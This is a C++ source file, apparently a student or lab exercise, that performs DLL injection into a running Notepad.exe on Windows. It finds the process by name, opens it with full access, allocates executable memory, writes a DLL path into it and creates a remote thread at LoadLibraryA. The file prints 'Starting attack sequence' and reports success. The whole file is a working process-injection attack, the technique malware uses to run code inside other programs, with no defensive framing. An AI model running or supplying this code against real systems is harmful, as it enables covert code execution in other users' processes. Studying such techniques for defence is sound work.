#include <iostream> // adding i/o library. It includes <ios>, <streambuf>, <istream>, <ostream>
#include <tchar.h> 
#include <wchar.h> // C std library. used for performing input & output operations on wide streams. Also used for manipulating wide-strings.
#include <Windows.h> // contains all of the functions in the WindowsAPI.
#include <TlHelp32.h> // Tool Help Library

using namespace std;

#define DLL_PATH "C:\\Users\\cpat-w-347355\\source\\repos\\MathLibrary\\x64\\Debug\\MathLibrary.dll"     // check this for accurate DLL path 
typedef int(__stdcall* f_attackFunction)();

// PRE-PROCESSOR directive to #define our binary name... makes it easy to switch targets but need to re-compile to change target
// better idea is to set as cmd line arg or user input during run time so re-compiling isn't required
#define TARGET_BINARY L"Notepad.exe"													

// forward declaration of our findProcessID function
DWORD findProcessID();


int main()
{
	DWORD pid;
	HANDLE hProcess;
	LPVOID lpBaseAddress;
	size_t size = strlen(DLL_PATH);
	int output_val = 0;

	// can remove this if stdout output isn't desired
	cout << "Starting attack sequence now...\n" << endl;

	// get pid for target binary
	pid = findProcessID();

	cout << "***************************************************" << endl;

	cout << "Process ID of target process: " << pid << endl;
	// this really should have a check to ensure PID != FALSE... 

	// get handle to target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	cout << "Handle of the target process: " << hProcess << endl;

	// create memory in target process
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	cout << "Base address of the target process: " << lpBaseAddress << endl;

	// write dll path to the target binary's memory
	output_val = WriteProcessMemory(hProcess, lpBaseAddress, DLL_PATH, size, NULL);
	cout << "Output of waht is written into the memory: " << output_val << endl;
	// get handle to kernel32.dll
	HMODULE hModule = GetModuleHandle(L"kernel32.dll");
	cout << "Handle of 'kernel32' module: " << hModule << endl;

	// get address of LoadLibraryA. LoadLibraryA loads the hModule into the address space of the DLL process.
	LPVOID lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");
	cout << "Start Address of the LoadLibraryA: " << lpStartAddress << endl;

	// create remote thread in target binary
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);
	cout << "Remote Thread in the target: " << hThread << endl;

	cout << "***************************************************" << endl;

	// handle error creating a remote thread.  I simply have stdout printf statements... you could do better stuff here if desired
	if (hThread)
	{
		printf("[+] Injection successfull ....\n");
	}
	else
	{
		printf("[-] Injection failed...\n");
	}
	//printf("%s got a handle to the newly created thread (%ld)\n\\---0x%p\n",k,,hProcess)
	CloseHandle(hThread);
	CloseHandle(hProcess);

}

/* Function to convert the process name to corresponding running Process ID.
*/

DWORD findProcessID()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32; // describes an entry from a list of processes residing in the system address space when a snapshot was taken.
	DWORD dwPriorityClass;

	// get a snapshot of currently running processes
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // takes a snapshot of the specified processes as well as heaps, modules and threads used by these processes.
	pe32.dwSize = sizeof(PROCESSENTRY32);
	// ensure hProcessSnap actually got a snapshot, otherwise quit
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	// iterate through the processes until we find the target, then return that specific process ID
	do {
		// compares two wide-character strings. 
		if (!wcscmp(pe32.szExeFile, TARGET_BINARY))
		{
			return pe32.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &pe32)); // retrieves information about the next process recorded in a system snapshot.
	return 0;
}